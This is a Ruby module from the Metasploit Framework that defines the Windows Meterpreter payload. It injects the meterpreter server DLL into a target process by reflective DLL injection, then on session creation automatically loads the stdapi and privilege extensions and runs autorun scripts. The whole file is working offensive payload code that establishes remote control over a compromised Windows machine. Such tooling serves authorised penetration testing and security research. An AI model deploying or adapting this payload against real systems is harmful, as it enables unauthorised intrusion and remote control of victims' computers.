##
# $Id: meterpreter.rb 7075 2009-09-27 21:30:45Z hdm $
##

##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


require 'msf/core'
require 'msf/core/payload/windows/reflectivedllinject'
require 'msf/base/sessions/meterpreter_x86_win'

###
#
# Injects the meterpreter server DLL via the Reflective Dll Injection payload
#
###
module Metasploit3

	include Msf::Payload::Windows::ReflectiveDllInject

	def initialize(info = {})
		super(update_info(info,
			'Name'          => 'Windows Meterpreter (Reflective Injection)',
			'Version'       => '$Revision: 7075 $',
			'Description'   => 'Inject the meterpreter server DLL via the Reflective Dll Injection payload',
			'Author'        => ['skape','sf'],
			'License'       => MSF_LICENSE,
			'Session'       => Msf::Sessions::Meterpreter_x86_Win))

		# Set advanced options
		register_advanced_options(
			[
				OptBool.new('AutoLoadStdapi',
					[
						true,
						"Automatically load the Stdapi extension",
						true
					]),
				OptString.new('AutoRunScript', [false, "Script to autorun on meterpreter session creation", ''])
			], self.class)

		# Don't let people set the library name option
		options.remove_option('LibraryName')
		options.remove_option('DLL')
	end

	def library_path
		File.join(Msf::Config.install_root, "data", "meterpreter", "metsrv.dll")
	end

	#
	# Once a session is created, automatically load the stdapi extension if the
	# advanced option is set to true.
	#
	def on_session(session)
		super
		if (datastore['AutoLoadStdapi'] == true)
			session.load_stdapi 
			if (framework.exploits.create(session.via_exploit).privileged?)
				session.load_priv 
			end
		end
		if (datastore['AutoRunScript'].empty? == false)
			client = session
			args = datastore['AutoRunScript'].split
			session.execute_script(args.shift, binding)
		end
	end

end
